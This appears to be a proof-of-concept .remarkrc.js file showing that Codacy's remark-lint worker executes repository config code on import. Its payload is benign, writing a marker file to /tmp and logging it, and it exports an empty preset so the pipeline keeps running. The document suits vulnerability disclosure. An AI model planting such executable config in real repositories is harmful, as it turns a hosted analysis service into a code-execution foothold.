// PoC payload — benign marker only.
// RCE via codacy-remark-lint: unified-engine discovers and imports the repo's .remarkrc.js
// (loadFromAbsolutePath -> await import(fileUrl)). Module top-level code runs inside the Codacy worker.
const fs = require("fs");
try {
  fs.writeFileSync("/tmp/codacy-remark-rce-confirmed.txt", "RCE confirmed via .remarkrc.js import. cwd=" + __dirname + "\n");
  console.log("CODEX-RCE-MARKER-REMARK " + __dirname + " /tmp/codacy-remark-rce-confirmed.txt");
} catch (e) { console.log("CODEX-RCE-MARKER-REMARK-ERR " + e.message); }

// A plain-config object is a valid remark-preset so the pipeline does not crash.
module.exports = {
  plugins: [],
  settings: {}
};
